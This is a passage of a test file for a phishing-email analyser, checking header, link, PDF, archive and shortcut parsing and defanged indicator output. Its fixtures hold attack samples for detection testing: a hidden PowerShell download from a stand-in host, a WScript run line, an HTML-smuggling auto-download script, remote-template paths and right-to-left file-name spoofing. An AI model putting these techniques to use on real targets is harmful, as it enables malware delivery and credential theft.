import { describe, expect, it, vi } from 'vitest'
import { deflateRaw, zip } from '../../test/zip'
import { hashBytes } from './eml'
import { analysePhishing, caseIocs, formatPhishReport, structureLines } from './phish'

// A switch for the one test that needs the PDF reader to break. Everything
// else in this file gets the real reader.
const pdfReader = vi.hoisted(() => ({ throws: false }))
vi.mock('./pdf', async (importOriginal) => {
  const real = await importOriginal<{ readPdf: (bytes: Uint8Array) => unknown }>()
  return {
    ...real,
    readPdf: (bytes: Uint8Array) => {
      if (pdfReader.throws) throw new Error('reader broke')
      return real.readPdf(bytes)
    }
  }
})

// A whole message, shaped like the real thing: nested multiparts, a
// quoted-printable text body with a soft line break, a base64 HTML body, a
// Safe Links-wrapped anchor whose visible text is a different domain, a
// tracking pixel, and a macro-capable attachment.
const html =
  '<html><body><img src="http://track.paypa1.test/open.gif" width="1">' +
  '<p>Your account is limited.</p>' +
  '<a href="https://eur01.safelinks.protection.outlook.com/?url=https%3A%2F%2Flogin.paypa1.test%2Fverify&amp;data=05">' +
  'https://www.paypal.test/signin</a></body></html>'

const MAIL = `Received: from mx.corp.test (mx.corp.test [10.4.1.9])
\tby inbox.corp.test with ESMTPS id 9f1
\tfor <analyst@corp.test>; Mon, 21 Sep 2026 09:20:10 +0000 (UTC)
Received: from vps-77.hostingcheap.example (vps-77.hostingcheap.example [203.0.113.77])
\tby mx.corp.test with ESMTP id 3c9; Mon, 21 Sep 2026 09:18:40 +0000
Authentication-Results: mx.corp.test; spf=softfail smtp.mailfrom=noreply@hostingcheap.example; dkim=none; dmarc=fail header.from=paypal.test
Return-Path: <noreply@hostingcheap.example>
From: "PayPal Service <service@paypal.test>" <security@paypa1.test>
Reply-To: recover@secure-verify.test
To: analyst@corp.test
Subject: =?utf-8?B?QWN0aW9uIHJlcXVpcmVkOiB5b3VyIGFjY291bnQgaXMgbGltaXRlZA==?=
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="MIXED1"

--MIXED1
Content-Type: multipart/alternative; boundary="ALT1"

--ALT1
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Your account is limited. Verify at https://login.paypa1.test/verify=
 now.
--ALT1
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

${btoa(html)}
--ALT1--
--MIXED1
Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_2026.docm"
Content-Disposition: attachment; filename="Invoice_2026.docm"
Content-Transfer-Encoding: base64

${btoa('fake macro document bytes')}
--MIXED1--
`

describe('inline parts and attachments that share a filename', () => {
  const COLLIDING = [
    'From: a@evil.test',
    'Subject: Invoice',
    'Content-Type: multipart/mixed; boundary="B"',
    '',
    '--B',
    'Content-Type: image/png',
    'Content-Disposition: inline; filename="image001.png"',
    'Content-Transfer-Encoding: base64',
    '',
    'iVBORw0KGgo=',
    '--B',
    'Content-Type: application/octet-stream',
    'Content-Disposition: attachment; filename="image001.png"',
    'Content-Transfer-Encoding: base64',
    '',
    'TVqQAAMAAAAEAAAA',
    '--B--',
    ''
  ].join('\n')

  it('keeps them apart, because a shared name used to merge them', async () => {
    const report = await analysePhishing(COLLIDING, [], [])
    expect(report.inlineImages).toHaveLength(1)
    expect(report.attachments).toHaveLength(1)
    // The one that matters: the real attachment is still on the attachment
    // side, where its declared-vs-actual mismatch gets reported.
    expect(report.attachments[0]?.sniffed).toContain('Windows executable')
  })
})

describe('analysePhishing over a whole message', () => {
  it('reads every layer of it', async () => {
    const report = await analysePhishing(MAIL, ['corp.test'], ['paypal', 'microsoft'])

    // Headers
    expect(report.headers.identities.find((i) => i.label === 'Subject')?.value).toBe(
      'Action required: your account is limited'
    )
    expect(report.headers.auth.map((a) => `${a.mechanism}=${a.result}`)).toEqual([
      'spf=softfail',
      'dkim=none',
      'dmarc=fail'
    ])
    expect(report.headers.hops[0].from).toContain('203.0.113.77')
    expect(report.headers.hops[1].delaySec).toBe(90)
    expect(report.headers.observations.map((o) => o.text)).toContain(
      'The display name contains an address at paypal.test, which is not the sending domain.'
    )

    // Body: soft line break joined, HTML kept as source
    expect(report.text).toContain('https://login.paypa1.test/verify now.')
    expect(report.htmlSource).toContain('<img src="http://track.paypa1.test/open.gif"')

    // Links: Safe Links unwrapped, look-alike folded, visible text compared
    const wrapped = report.links.find((l) => l.wrappedBy === 'Microsoft Safe Links')
    expect(wrapped?.target).toBe('https://login.paypa1.test/verify')
    expect(wrapped?.flags).toContain('reads as "paypal" once look-alike characters are folded')
    expect(wrapped?.flags).toContain('shown as a link to www.paypal.test, points at login.paypa1.test')

    // Attachment: hashed here, type named, nothing called malicious
    expect(report.attachments).toHaveLength(1)
    const [attachment] = report.attachments
    expect(attachment.filename).toBe('Invoice_2026.docm')
    expect(attachment.size).toBe('fake macro document bytes'.length)
    expect(attachment.sha256).toMatch(/^[0-9a-f]{64}$/)
    expect(attachment.sha1).toMatch(/^[0-9a-f]{40}$/)
    expect(attachment.facts).toContain('file type that can carry macros')
  })

  it('reaches no verdict anywhere in the report it emits', async () => {
    const markdown = formatPhishReport(await analysePhishing(MAIL, ['corp.test'], ['paypal']))
    expect(markdown).not.toMatch(/malicious|phishing|suspicious|spoofed|dangerous|threat/i)
    // Hashes are labelled with where they came from, always.
    expect(markdown).toContain('(computed here)')
    // Links in the LINKS section are defanged, so a copied report cannot be
    // clicked through. The body is a separate matter: it is evidence and is
    // carried verbatim, inside a fence, where nothing autolinks.
    expect(markdown).toContain('hxxps://login[.]paypa1[.]test/verify')
    const linkLine = markdown.split('\n').find((l) => l.startsWith('- hxxps://login')) ?? ''
    expect(linkLine).not.toContain('https://login.paypa1.test/verify')
  })
})

describe('the whole-message report after hardening', () => {
  it('builds indicators from the parsed message, not the raw paste', async () => {
    const report = await analysePhishing(MAIL, ['corp.test'], ['paypal'])
    const joined = report.indicators.join('\n')
    // The phishing URL is split by a quoted-printable soft line break in the
    // raw text, so scanning `raw` missed it entirely.
    expect(joined).toContain('login[.]paypa1[.]test')
    // And nothing from the base64 of the HTML part leaks in as an "indicator".
    expect(report.indicators.some((i) => i.includes('PGh0bWw'))).toBe(false)
  })

  it('carries the sender domain’s own look-alike facts', async () => {
    const report = await analysePhishing(MAIL, [], ['paypal'])
    expect(report.senderFacts).toContain('reads as "paypal" once look-alike characters are folded')
  })

  it('quarantines hostile values so the case note cannot be used as a beacon', async () => {
    const hostile = MAIL.replace(
      'Subject: =?utf-8?B?QWN0aW9uIHJlcXVpcmVkOiB5b3VyIGFjY291bnQgaXMgbGltaXRlZA==?=',
      'Subject: ![[private]] <img src="http://beacon.test/x.gif">'
    )
    const markdown = formatPhishReport(await analysePhishing(hostile, [], []))
    // Every line carrying the hostile string must have it inside inline code.
    const carrying = markdown.split('\n').filter((line) => line.includes('beacon.test'))
    expect(carrying.length).toBeGreaterThan(0)
    expect(carrying.every((line) => /`[^`]*beacon\.test[^`]*`/.test(line))).toBe(true)
    expect(markdown).not.toMatch(/^- Subject: !\[\[/m)
  })

  it('still reaches no verdict', async () => {
    const markdown = formatPhishReport(await analysePhishing(MAIL, ['corp.test'], ['paypal']))
    expect(markdown).not.toMatch(/malicious|phishing|suspicious|spoofed|dangerous|threat/i)
  })
})

describe('a hash is either this machine’s answer or nothing', () => {
  const b64 = (s: string): string => btoa(s)

  it('pins the digest to a value, not a shape', async () => {
    const mail =
      'Content-Type: application/octet-stream\n' +
      'Content-Disposition: attachment; filename="a.bin"\n' +
      `Content-Transfer-Encoding: base64\n\n${b64('MZ payload')}\n`
    const [a] = (await analysePhishing(mail, [], [])).attachments
    // The literal digest, computed outside this codebase with `shasum -a 256`.
    // Pinned to a VALUE, not a shape: a test that only checks 64 hex characters
    // passes just as happily on the hash of an empty file.
    expect(a.sha256).toBe('48bf631186b8c57da7e7a47b870604e8d58fa140633ee0c899cf25a549ebd7a6')
    expect(a.size).toBe('MZ payload'.length)
  })

  it('records nothing at all for a part it could not decode', async () => {
    // The exact shape that used to print the empty file's SHA-256 under
    // "computed here, from the bytes in the file".
    const mail =
      'Content-Type: application/octet-stream\n' +
      'Content-Disposition: attachment; filename="a.bin"\n' +
      'Content-Transfer-Encoding: base64\n\n=====\n'
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    expect(a.sha256).toBe('')
    expect(a.sha1).toBe('')
    expect(a.facts).toContain('this part could not be decoded, so its size, hashes and type are not recorded')
    const md = formatPhishReport(report)
    expect(md).toContain('SHA-256 not recorded')
    expect(md).toContain('size not recorded')
    expect(md).not.toContain('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
  })
})

describe('the report carries the message body it says it carries', () => {
  it('emits the body, fenced, so a case records the mail and not just the analysis', async () => {
    const markdown = formatPhishReport(await analysePhishing(MAIL, [], []))
    expect(markdown).toContain('### Message body')
    expect(markdown).toContain('Your account is limited.')
    expect(markdown).toContain('<img src="http://track.paypa1.test/open.gif"')
  })

  it('fences content that contains a fence, so it cannot close its own block', async () => {
    const mail = 'Content-Type: text/plain\n\n```\n![[private]] <img src="http://beacon.test/x">\n`````\n'
    const markdown = formatPhishReport(await analysePhishing(mail, [], []))
    expect(markdown).toContain('``````')
    // The embed is inside the fence, not loose in the note.
    const lines = markdown.split('\n')
    const fenceStarts = lines.reduce((n, l) => n + (/^`{3,}$/.test(l) ? 1 : 0), 0)
    expect(fenceStarts % 2).toBe(0)
  })

  it('says so when there is no body rather than implying one', async () => {
    const markdown = formatPhishReport(await analysePhishing('From: a@b.test\nSubject: hi', [], []))
    expect(markdown).toContain('### Message body\n\nNot recorded.')
  })
})

describe('the extracted text travels with the analysis', () => {
  it('is on the report, so the screen, the clipboard and the case agree', async () => {
    const report = await analysePhishing(MAIL, [], [])
    expect(report.htmlText).toContain('Your account is limited.')
    // The markup itself is not in the extracted text.
    expect(report.htmlText).not.toContain('<img')
    expect(report.htmlText).not.toContain('track.paypa1.test/o.gif')

    const md = formatPhishReport(report)
    expect(md).toContain('Text extracted from the HTML, not rendered:')
    expect(md).toContain('Your account is limited.')
    // The source is still carried beside it, not replaced by it.
    expect(md).toContain('HTML source, not rendered:')
  })

  it('is empty, not invented, when the mail has no HTML part', async () => {
    const report = await analysePhishing('Content-Type: text/plain\n\nJust words.', [], [])
    expect(report.htmlText).toBe('')
    expect(formatPhishReport(report)).not.toContain('Text extracted from the HTML')
  })
})

describe('a PDF attachment is read for its structure', () => {
  const JPEG = [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0xff, 0xd9]
  const head = '%PDF-1.7\n1 0 obj\n<< /Type /XObject /Subtype /Image /Filter /DCTDecode /Length 13 >>\nstream\n'
  const tail =
    '\nendstream\nendobj\n2 0 obj\n<< /A << /S /URI /URI (https://qr-lure.test/login) >> >>\nendobj\n' +
    'trailer\n<< /Root 1 0 R >>\n%%EOF\n'
  const bytes = [...head]
    .map((c) => c.charCodeAt(0))
    .concat(
      JPEG,
      [...tail].map((c) => c.charCodeAt(0))
    )
  const b64 = btoa(String.fromCharCode(...bytes))
  const mail =
    'From: a@sender.test\nTo: b@corp.test\nSubject: scan\nMIME-Version: 1.0\n' +
    'Content-Type: multipart/mixed; boundary="B"\n\n--B\nContent-Type: text/plain\n\nsee attached\n' +
    '--B\nContent-Type: application/pdf\nContent-Disposition: attachment; filename="scan.pdf"\n' +
    `Content-Transfer-Encoding: base64\n\n${b64}\n--B--\n`

  it('carries the picture, the link and its indicator into the report', async () => {
    const report = await analysePhishing(mail, [], [])
    const [pdf] = report.attachments
    expect(pdf.pdf?.images.map((i) => i.sniffed)).toEqual(['JPEG image'])
    expect(pdf.pdf?.uris).toEqual(['https://qr-lure.test/login'])
    // Found by the reader, and shown where it was found. The plain-bytes pass
    // sees the same URL here, and printing it again under "found inside the
    // file" only doubled the line on the card and in the report.
    expect(pdf.inside.some((l) => l.includes('qr-lure'))).toBe(false)
    // The lure is the indicator the analyst will block, so it reaches the
    // copied list and the case — not only the attachment's card.
    expect(report.indicators).toContain('url: hxxps://qr-lure[.]test/login')
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'url',
      value: 'https://qr-lure.test/login',
      note: 'inside scan.pdf'
    })
    const text = formatPhishReport(report)
    expect(text).toContain('PDF link (/URI): `hxxps://qr-lure[.]test/login`')
    expect(text).toMatch(
      /embedded picture `byte \d+ \(\/DCTDecode\)`: JPEG image, 13 bytes, SHA-256 [0-9a-f]{64} \(computed here\)/
    )
  })
})

// ─── Attachments built byte by byte ─────────────────────────────────────────

const ascii = (text: string): Uint8Array => Uint8Array.from(text, (c) => c.charCodeAt(0))

function base64(bytes: Uint8Array): string {
  let binary = ''
  for (let i = 0; i < bytes.length; i += 0x8000) binary += String.fromCharCode(...bytes.subarray(i, i + 0x8000))
  return btoa(binary)
}

interface MailPart {
  headers: string[]
  /** The base64 body as written, for a part that must not decode. */
  body?: string
  bytes?: Uint8Array
}

const attached = (name: string, bytes: Uint8Array, type = 'application/octet-stream'): MailPart => ({
  headers: [`Content-Type: ${type}; name="${name}"`, `Content-Disposition: attachment; filename="${name}"`],
  bytes
})

/** A multipart mail with a short text body, then each part base64-encoded. */
function mailWith(...parts: MailPart[]): string {
  const lines = [
    'From: a@sender.test',
    'To: b@corp.test',
    'Subject: files',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="B"',
    '',
    '--B',
    'Content-Type: text/plain',
    '',
    'see attached'
  ]
  for (const part of parts) {
    lines.push(
      '--B',
      ...part.headers,
      'Content-Transfer-Encoding: base64',
      '',
      part.body ?? base64(part.bytes ?? new Uint8Array())
    )
  }
  lines.push('--B--', '')
  return lines.join('\n')
}

/** A PDF whose objects are the strings given, in order. */
const pdf = (...objects: string[]): string =>
  `%PDF-1.7\n${objects.map((o, i) => `${i + 1} 0 obj\n${o}\nendobj\n`).join('')}trailer\n<< /Root 1 0 R >>\n%%EOF\n`

const hex = (text: string): string => [...text].map((c) => c.charCodeAt(0).toString(16).padStart(2, '0')).join('')

const PNG = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d, 0x49, 0x48, 0x44, 0x52])

const rels = (...targets: [type: string, target: string][]): Uint8Array =>
  ascii(
    '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      targets
        .map(
          ([type, target], i) =>
            `<Relationship Id="rId${i + 1}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="${target}" TargetMode="External"/>`
        )
        .join('') +
      '</Relationships>'
  )

describe('a part marked inline is filed by what its bytes are', () => {
  const lure = ascii(pdf('<< /Type /Catalog >>', '<< /A << /S /URI /URI (https://lure.example.test/login) >> >>'))

  it('files a PDF with a Content-ID as the attachment it is, lure and all', async () => {
    // Gmail puts a Content-ID on ordinary attachments. The flag alone filed this
    // under inline images, and its lure reached neither Indicators nor the report.
    const mail = mailWith({
      headers: [
        'Content-Type: application/pdf; name="Scan.pdf"',
        'Content-Disposition: attachment; filename="Scan.pdf"',
        'Content-ID: <part1@sender.test>'
      ],
      bytes: lure
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments).toHaveLength(1)
    expect(report.inlineImages).toHaveLength(0)
    expect(report.indicators).toContain('url: hxxps://lure[.]example[.]test/login')
    expect(formatPhishReport(report)).toContain('PDF link (/URI): `hxxps://lure[.]example[.]test/login`')
    expect(report.attachments[0].facts).toContain('marked inline or given a Content-ID by its own headers')
  })

  it('files a PDF sent as inline with a filename, as Apple Mail sends one, the same way', async () => {
    const hidden = ascii(
      pdf('<< /Type /Catalog >>', `<< /A << /S /URI /URI <${hex('https://inline-lure.test/login')}> >> >>`)
    )
    const mail = mailWith({
      headers: ['Content-Type: application/pdf', 'Content-Disposition: inline; filename="scan.pdf"'],
      bytes: hidden
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments.map((a) => a.filename)).toEqual(['scan.pdf'])
    expect(report.indicators).toContain('url: hxxps://inline-lure[.]test/login')
    expect(formatPhishReport(report)).toContain('hxxps://inline-lure[.]test/login')
  })

  it('files a part it could not decode as an attachment, never as "0 bytes"', async () => {
    const mail = mailWith({
      headers: ['Content-Type: image/png', 'Content-Disposition: inline; filename="logo.png"', 'Content-ID: <logo>'],
      body: '!!!!'
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments.map((a) => a.filename)).toEqual(['logo.png'])
    expect(report.inlineImages).toHaveLength(0)
    const md = formatPhishReport(report)
    expect(md).toContain('size not recorded')
    expect(md).not.toContain('0 bytes')
  })

  it('still files a real inline picture as one, and still carries its hash', async () => {
    const mail = mailWith({
      headers: ['Content-Type: image/png', 'Content-Disposition: inline; filename="logo.png"', 'Content-ID: <logo>'],
      bytes: PNG
    })
    const report = await analysePhishing(mail, [], [])
    expect(report.inlineImages.map((a) => a.filename)).toEqual(['logo.png'])
    // Which side of the split a part lands on is display only: its hash is evidence either way.
    expect(report.indicators).toContain(`hash: ${await hashBytes(PNG)}`)
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'hash',
      value: await hashBytes(PNG),
      note: 'logo.png (hashed here)'
    })
  })
})

describe('the case carries what the analysis found', () => {
  it('builds the same typed set createCase did, from the headers, the text, the links and the hashes', async () => {
    const report = await analysePhishing(MAIL, ['corp.test'], ['paypal'])
    const iocs = caseIocs(report, MAIL)
    expect(iocs).toContainEqual({ type: 'ip', value: '203.0.113.77' })
    expect(iocs).toContainEqual({ type: 'url', value: 'https://login.paypa1.test/verify' })
    expect(iocs).toContainEqual({
      type: 'hash',
      value: report.attachments[0].sha256,
      note: 'Invoice_2026.docm (hashed here)'
    })
    // Each value once, whatever case it was written in.
    const values = iocs.map((i) => i.value.toLowerCase())
    expect(new Set(values).size).toBe(values.length)
  })
})

describe('a PDF whose header does not start the file', () => {
  const body = pdf(
    '<< /Type /Catalog /OpenAction 2 0 R >>',
    `<< /S /URI /URI <${hex('https://hidden-lure.test/login')}> >>`
  )

  for (const [label, prefix] of [
    ['one space', [0x20]],
    ['a byte-order mark', [0xef, 0xbb, 0xbf]]
  ] as const) {
    it(`still reaches the PDF reader after ${label}`, async () => {
      // Acrobat opens it. The sniff wanted %PDF at byte 0, so the reader never
      // ran and the hex /URI, which no text scan can see, was lost silently.
      const bytes = new Uint8Array([...prefix, ...ascii(body)])
      const report = await analysePhishing(mailWith(attached('Scan.pdf', bytes, 'application/pdf')), [], [])
      const [a] = report.attachments
      expect(a.pdf?.markers.map((m) => m.name)).toContain('/OpenAction')
      expect(a.pdf?.notes).toContain(`The %PDF header is at offset ${prefix.length}, not at the start of the file.`)
      expect(report.indicators).toContain('url: hxxps://hidden-lure[.]test/login')
      // True of the bytes, and the reason the reader had to be asked at all.
      expect(a.facts).toContain('named .pdf but its first bytes match no file signature this recognises')
    })
  }

  it('does not read a text file as a PDF because it mentions endobj and %%EOF', async () => {
    const text = ascii('notes on the format: every object ends with endobj and the file with %%EOF\n')
    const report = await analysePhishing(mailWith(attached('notes.txt', text, 'text/plain')), [], [])
    expect(report.attachments[0].pdf).toBeUndefined()
  })
})

describe('what an archive holds', () => {
  it('lists a zip’s entries without saying its contents are not visible', async () => {
    const js = ascii('WScript.Shell.Run("powershell -w hidden")')
    const bytes = zip([{ name: 'Invoice_0931.js', data: js }])
    const report = await analysePhishing(mailWith(attached('Invoice.zip', bytes, 'application/zip')), [], [])
    const [a] = report.attachments
    expect(a.facts).not.toContain('archive — its contents are not visible from here')
    expect(a.office?.entries.map((e) => e.name)).toEqual(['Invoice_0931.js'])
    expect(structureLines(a)).toContain('  - entry `Invoice_0931.js`: named like an executable or script')
  })

  it('keeps the name-only fact for an archive it cannot read', async () => {
    const bytes = new Uint8Array([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0, 4])
    const report = await analysePhishing(mailWith(attached('files.7z', bytes)), [], [])
    expect(report.attachments[0].facts).toContain('archive — its contents are not visible from here')
  })

  it('types and hashes the files inside, so a PE named Invoice.pdf is caught by its bytes', async () => {
    const pe = new Uint8Array(600)
    pe.set([0x4d, 0x5a, 0x90, 0x00])
    const bytes = zip([
      { name: 'Invoice.pdf', data: pe },
      { name: 'view.html', data: ascii('<html><body>hi</body></html>') },
      { name: 'run.js', data: ascii('var a = 1') }
    ])
    const mail = mailWith(attached('files.zip', bytes, 'application/zip'))
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    const digest = await hashBytes(pe)
    const lines = structureLines(a)
    expect(lines).toContain(
      `  - inner file \`Invoice.pdf\`: named .pdf but the bytes begin as Windows executable (MZ); SHA-256 ${digest} (computed here)`
    )
    expect(lines).toContain('  - entry `view.html`: named as a web page, SVG or OneNote file')
    expect(report.indicators).toContain(`hash: ${digest}`)
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'hash',
      value: digest,
      note: 'Invoice.pdf inside files.zip (hashed here)'
    })
    // The report keeps what each file is, not the file.
    expect(Object.keys(a.office?.files[0] ?? {}).sort()).toEqual(['mismatch', 'name', 'sha256', 'sniffed'])
  })

  it('names what a file it could not read whole begins as, and gives no hash for it', async () => {
    const big = new Uint8Array(8_000_001)
    big.set([0x4d, 0x5a])
    const bytes = zip([{ name: 'payload.bin', data: await deflateRaw(big), method: 8, size: big.length }])
    const report = await analysePhishing(mailWith(attached('files.zip', bytes)), [], [])
    expect(structureLines(report.attachments[0])).toContain(
      '  - inner file `payload.bin`: bytes begin as Windows executable (MZ); not read whole, so not hashed here'
    )
  })

  it('caps the flagged entries in the report, and still says which ones are encrypted', async () => {
    const many = zip(Array.from({ length: 200 }, (_, i) => ({ name: `Invoice_${i}.exe`, data: ascii('xx'), flags: 1 })))
    const report = await analysePhishing(mailWith(attached('Invoices.zip', many)), [], [])
    const lines = structureLines(report.attachments[0])
    expect(lines.filter((l) => l.startsWith('  - entry ')).length).toBe(50)
    expect(lines).toContain('  - 150 further flagged entries are not listed')

    const mixed = zip([
      { name: 'payload.exe', data: ascii('xx'), flags: 1 },
      { name: 'readme.txt', data: ascii('read me') }
    ])
    const one = await analysePhishing(mailWith(attached('pw-1234.zip', mixed)), [], [])
    expect(structureLines(one.attachments[0])).toContain(
      '  - entry `payload.exe`: named like an executable or script; encrypted, so its contents cannot be read here'
    )
  })

  it('counts the entries it read, never the ones a directory it did not reach might list', async () => {
    // An end record declaring five entries, with two present.
    const short = zip([
      { name: 'a.txt', data: ascii('a') },
      { name: 'b.txt', data: ascii('b') }
    ])
    const eocd = new DataView(short.buffer, short.length - 22)
    eocd.setUint16(8, 5, true)
    eocd.setUint16(10, 5, true)
    const report = await analysePhishing(mailWith(attached('short.zip', short)), [], [])
    const lines = structureLines(report.attachments[0])
    expect(lines).toContain('  - 2 entries read from the ZIP directory')
    expect(lines.join('\n')).not.toMatch(/directory lists/)

    // No end record at all: no count, and the reader's note says why.
    const headless = new Uint8Array([0x50, 0x4b, 0x03, 0x04, ...new Uint8Array(200)])
    const none = await analysePhishing(mailWith(attached('broken.zip', headless)), [], [])
    const noneLines = structureLines(none.attachments[0])
    expect(noneLines.join('\n')).not.toMatch(/entr(y|ies) read from|directory lists/)
    expect(noneLines.join('\n')).toContain('no end-of-central-directory record was found')
  })

  it('escapes the names a sender wrote, so they cannot reorder the report or add rows to it', async () => {
    const bytes = zip([
      { name: 'a\u202Egpj.exe', data: ascii('xx') },
      { name: 'b.xml\n1,024 bytes\tDeflate\tword/fake.bin', data: ascii('<x/>') }
    ])
    const report = await analysePhishing(mailWith(attached('report\u202Eqiz.zip', bytes)), [], [])
    const lines = structureLines(report.attachments[0])
    // Flagged on the raw name, shown escaped.
    expect(lines).toContain('  - entry `a<U+202E>gpj.exe`: named like an executable or script')
    expect(lines.some((l) => l.includes('b.xml<U+000A>1,024 bytes<U+0009>Deflate'))).toBe(true)
    expect(lines.some((l) => /[\u202E\n\t]/.test(l))).toBe(false)
    expect(formatPhishReport(report)).toContain('- `report<U+202E>qiz.zip` — ')
  })

  it('puts a remote template written as a UNC path into the indicators, and a local path nowhere', async () => {
    const bytes = zip([
      { name: '[Content_Types].xml', data: ascii('<Types/>') },
      {
        name: 'word/_rels/settings.xml.rels',
        data: rels(
          ['attachedTemplate', '\\\\files.corp-share.app@SSL\\DavWWWRoot\\t.dotm'],
          ['attachedTemplate', '\\\\.\\pipe\\x'],
          ['attachedTemplate', '\\\\fileserver\\share'],
          ['attachedTemplate', 'file:///C:/x.dotm']
        )
      }
    ])
    const mail = mailWith(attached('Template.docx', bytes))
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments[0].office?.externalTargets).toHaveLength(4)
    const found = report.indicators.filter((l) => !/^(email|hash): /.test(l))
    expect(found).toEqual(['domain: files[.]corp-share[.]app'])
    expect(caseIocs(report, mail)).toContainEqual({
      type: 'domain',
      value: 'files.corp-share.app',
      note: 'inside Template.docx'
    })
  })
})

describe('a message’s pictures share one budget', () => {
  it('stops at 64 MB across the attachments, and says so on the ones it did not read', async () => {
    const picture = new Uint8Array(8_000_000)
    picture.set(PNG)
    const packed = await deflateRaw(picture)
    const docx = zip(
      [1, 2, 3, 4].map((n) => ({ name: `word/media/image${n}.png`, data: packed, method: 8, size: picture.length }))
    )
    const mail = mailWith(...Array.from({ length: 20 }, (_, i) => attached(`Pics_${i}.docx`, docx)))
    const report = await analysePhishing(mail, [], [])
    const held = report.attachments.reduce(
      (sum, a) => sum + (a.office?.images ?? []).reduce((n, image) => n + image.bytes.length, 0),
      0
    )
    expect(held).toBeGreaterThan(0)
    expect(held).toBeLessThanOrEqual(64_000_000)
    const last = report.attachments[report.attachments.length - 1]
    expect(last.office?.notes.join(' ')).toContain(
      "this message's budget for pictures and inner files was used up by what was read before them"
    )
  })

  it('reads every picture of an ordinary message and mentions no budget', async () => {
    const docx = zip([{ name: 'word/media/image1.png', data: PNG }])
    const report = await analysePhishing(
      mailWith(...Array.from({ length: 12 }, (_, i) => attached(`Letter_${i}.docx`, docx))),
      [],
      []
    )
    expect(report.attachments.map((a) => a.office?.images.length)).toEqual(Array.from({ length: 12 }, () => 1))
    expect(formatPhishReport(report)).not.toMatch(/budget/)
  })
})

describe('text the plain scan could not see', () => {
  it('reads a shortcut’s UTF-16 command line, even at an odd offset', async () => {
    const header = [0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]
    const args = '-w hidden -c iwr https://evil-cdn.test/stage2.ps1 -OutFile $env:TEMP\\a.ps1'
    const bytes = new Uint8Array(900).fill(0xff)
    bytes.set(header)
    const at = 601
    for (let i = 0; i < args.length; i++) bytes.set([args.charCodeAt(i), 0], at + i * 2)
    bytes.set([0, 0], at + args.length * 2)
    const report = await analysePhishing(mailWith(attached('Invoice.pdf', bytes, 'application/pdf')), [], [])
    const [a] = report.attachments
    expect(a.facts).toContain('named .pdf but the bytes begin as Windows shortcut (LNK)')
    expect(a.inside).toContain('url: hxxps://evil-cdn[.]test/stage2[.]ps1')
  })

  it('never reads a UTF-16 URL only up to a letter outside ASCII', async () => {
    // `https://ex.test/pa` + Cyrillic т + `h`: cut at the т, the front is a URL the file does not hold.
    const utf16 = (text: string): number[] => [...text].flatMap((c) => [c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8])
    const bytes = new Uint8Array([
      0xff,
      ...utf16('go https://ex.test/pa\u0442h'),
      0,
      0,
      ...utf16('also https://whole.test/ok'),
      0,
      0
    ])
    const report = await analysePhishing(mailWith(attached('note.bin', bytes)), [], [])
    const [a] = report.attachments
    expect(a.inside).toContain('url: hxxps://whole[.]test/ok')
    expect(a.inside.some((l) => l.includes('ex[.]test'))).toBe(false)
  })

  it('finds the script an HTML smuggling page keeps after its blob, and counts its names', async () => {
    const page =
      '<html><body><div id="p">' +
      'UEsDBBQA'.repeat(150_000) +
      '</div><script>var d=atob(document.getElementById("p").textContent);' +
      'var u=URL.createObjectURL(new Blob([d]));var a=document.createElement("a");a.href=u;' +
      'a.download="Invoice.zip";a.click();window.location="https://login-evil.test/done"</script></body></html>'
    const report = await analysePhishing(mailWith(attached('Remittance.html', ascii(page), 'text/html')), [], [])
    const [a] = report.attachments
    expect(a.inside).toContain('url: hxxps://login-evil[.]test/done')
    const census = a.facts.find((f) => f.startsWith('script and markup names found:')) ?? ''
    expect(census).toContain('atob( ×1')
    expect(census).toContain('createObjectURL ×1')
    // Whole at this size, so nothing is said about bytes not scanned.
    expect(a.facts.join(' ')).not.toContain('not scanned')
  })

  it('stops the list at 100 and says how many more it found', async () => {
    const text = Array.from({ length: 105 }, (_, i) => `https://host${i}.test/p`).join('\n')
    const report = await analysePhishing(mailWith(attached('list.txt', ascii(text), 'text/plain')), [], [])
    const [a] = report.attachments
    expect(a.inside).toHaveLength(100)
    expect(a.facts).toContain('5 further indicators found inside the file are not listed')
  })

  it('reads the two ends of a larger file, says what it skipped, and never half an indicator', async () => {
    const size = 3_000_000
    const bytes = new Uint8Array(size).fill(0x7a) // 'z': no word break, no hex digit, no dot
    const put = (at: number, text: string): void => bytes.set(ascii(text), at)
    put(0, 'start https://head-side.example.com/x\n')
    // Straddles the end of the first window: cut there, it would be a URL the file does not hold.
    put(1_000_000 - 10, ' https://edge-cut.example.com/abcdefghijklmnop ')
    put(1_500_000, ' https://middle.example.com/m ')
    put(size - 100, ' https://tail-side.example.com/t\n')
    const report = await analysePhishing(mailWith(attached('big.txt', bytes, 'text/plain')), [], [])
    const [a] = report.attachments
    expect(a.inside).toContain('url: hxxps://head-side[.]example[.]com/x')
    expect(a.inside).toContain('url: hxxps://tail-side[.]example[.]com/t')
    expect(a.inside.some((l) => /middle|edge-cut/.test(l))).toBe(false)
    const said = a.facts.find((f) => f.startsWith('indicators were read from')) ?? ''
